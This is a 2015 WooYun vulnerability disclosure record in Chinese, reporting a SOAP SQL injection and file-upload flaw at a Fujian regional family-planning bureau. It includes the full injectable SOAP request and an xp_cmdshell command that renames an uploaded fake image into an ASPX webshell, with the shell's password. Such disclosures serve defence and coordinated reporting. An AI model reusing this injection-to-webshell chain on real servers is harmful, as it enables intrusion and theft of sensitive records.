bugs/wooyun-2015-0159237.json

{"id": 72986, "wybug_id": "wooyun-2015-0159237", "wybug_title": "福建省某地区计生局被入侵敏感信息泄露可沦陷整个内网或县机构的信息安全（SOAP注入+上传漏洞）", "wybug_corp": "福建省某地区", "wybug_author": "niexinming", "wybug_date": "2015-12-08 13:40", "wybug_open_date": "2016-01-23 15:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向公众公开  简要描述： 安全就是你身上不起眼的伤口，但是在合适的时候却能要你的命 详细说明：  首先依然是soap的soap的sql注入**.**.**.**:10000/RenderService.svc?wsdl\nPOST /RenderService.svc HTTP/1.1Content-Type: text/xmlSOAPAction: \"http://**.**.**.**/IRenderService/CreateChart\"Content-Length: 795X-Requested-With: XMLHttpRequestReferer: **.**.**.**:10000/RenderService.svc?wsdlHost: **.**.**.**:10000Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://**.**.**.**/soap/envelope/\" xmlns:soap=\"http://**.**.**.**/wsdl/soap/\"  xmlns:xsd=\"http://**.**.**.**/1999/XMLSchema\"  xmlns:xsi=\"http://**.**.**.**/1999/XMLSchema-instance\"  xmlns:m0=\"http://**.**.**.**/\"  xmlns:SOAP-ENC=\"http://**.**.**.**/soap/encoding/\" xmlns:urn=\"http://**.**.**.**/\" xmlns:urn2=\"http://**.**.**.**/2003/10/Serialization/\" xmlns:urn3=\"http://**.**.**.**/2003/10/Serialization/Arrays\">     <SOAP-ENV:Header/>     <SOAP-ENV:Body>        <urn:CreateChart>           <urn:excelViewID>注入点</urn:excelViewID>           <urn:createExcelParameter>1</urn:createExcelParameter>        </urn:CreateChart>     </SOAP-ENV:Body></SOAP-ENV:Envelope>\n利用这个注入点，然后开了sql server的xp_cmdshell 然后利用这个执行cmd指令：得到网站的绝对路径：e:\\连成发布20140922\\view\\然后，利用另一个端口的上传文件的功能上传一个后缀改成jpg的木马**.**.**.**:16888/Pages/Business/WebForm1.aspx   //上传点：上传一个叫x.jpg然后利用sql注入漏洞改文件后缀：';exec master..xp_cmdshell 'rename e:\\连成发布20140922\\view\\x.jpg x.aspx' --在**.**.**.**:16888/x.aspx 的得到一只木马 密码 r00ts在服务器里面发现大量敏感信息，萌萌哒管理员把所有密码放在  G:\\计生软件\\  这里面   漏洞证明：  于是：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  过滤，不要把敏感文件放在服务器里面这里有个彩蛋：\n\n   版权声明：转载请注明来源 niexinming@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-12-11 16:12 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给福建分中心,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}